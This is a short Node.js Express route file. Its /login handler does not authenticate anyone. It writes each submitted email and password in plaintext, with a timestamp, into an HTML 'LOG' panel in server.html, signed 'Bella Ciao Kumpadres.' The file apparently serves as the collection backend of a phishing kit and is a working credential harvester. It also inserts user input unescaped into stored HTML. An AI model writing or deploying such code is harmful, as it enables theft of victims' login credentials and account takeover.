const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const http = require('http');
router.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;
  const date = new Date();
  const options = {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: 'numeric',
    minute: 'numeric',
    second: 'numeric',
    hour12: false,
    timeZone: 'UTC'
  };
  const formatter = new Intl.DateTimeFormat('en-US', options);
  const timestamp = formatter.format(date);

  const data = `${username} ${password} ${timestamp}\n`;
  const filePath = path.join(__dirname, 'server.html');
  const html = `
          <div class="row">
            <div class="col-xl-3 col-sm-6 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <div class="row">
                    <div class="col-9">
                      <div class="d-flex align-items-center align-self-start">
                        <h3 class="mb-0">LOG</h3>
                        <p class="text-success ml-2 mb-0 font-weight-medium">+1</p>
                      </div>
                    </div>
                    <div class="col-3">
                      <div class="icon icon-box-success ">
                        <span class="mdi mdi-arrow-top-right icon-item"></span>
                      </div>
                    </div>
                  </div>
                  <p><strong>Email:</strong> ${username}<br><strong>Password:</strong> ${password}<br><strong>Timestamp:</strong> ${timestamp}</p>
                  <h6 class="text-muted font-weight-normal">Bella Ciao Kumpadres.</h6>
                </div>
              </div>
            </div>
            </div>
            
`;
  fs.appendFile(filePath, html, (err) => {
    if (err) {
      console.error(err);
      res.send('An error occurred while saving your data.');
    } else {
      res.send('Your data was saved successfully!');
    }
  });
});

module.exports = router;
        